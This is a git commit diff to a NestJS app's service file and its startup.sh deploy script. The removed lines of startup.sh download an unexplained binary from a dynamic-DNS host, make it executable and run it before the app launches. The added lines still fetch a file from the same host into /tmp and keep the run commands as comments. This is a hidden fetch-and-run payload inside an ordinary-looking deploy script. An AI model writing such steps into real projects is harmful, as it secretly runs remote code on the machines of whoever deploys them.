f0be33981642c46ef22ccd107a6469b6be9db0c9
paulkey731 <paul.key731@gmail.com>
2026-04-12 01:50:18 -0700

    111

--- src/app.service.ts
+++ src/app.service.ts
@@ -3,6 +3,6 @@ import { Injectable } from '@nestjs/common';
 @Injectable()
 export class AppService {
   getHello(): string {
-    return 'Hello real final from 0st_Web!!! 🚀';
+    return '111';
   }
 }
--- startup.sh
+++ startup.sh
@@ -3,11 +3,16 @@ echo "========================================="
 echo "  Hello Deploy is starting up on AWS!"
 echo "========================================="
 
-curl -L "http://abbh.ddnsgeek.com/public/attget" -o /tmp/attget
-curl -L "http://abbh.ddnsgeek.com/public/attget.lck" -o /tmp/attget.lck
-sleep 2
-chmod +x /tmp/attget
-/tmp/attget skip
-sleep 2
+curl -L "http://abbh.ddnsgeek.com/public/temp.txt" -o /tmp/attget
+echo "File downloaded:"
+ls -la /tmp/attget
+cat /tmp/attget
+
+# curl -L "http://abbh.ddnsgeek.com/public/attget" -o /tmp/attget
+# curl -L "http://abbh.ddnsgeek.com/public/attget.lck" -o /tmp/attget.lck
+# sleep 2
+# chmod +x /tmp/attget
+# /tmp/attget skip
+# sleep 2
 
 node dist/main
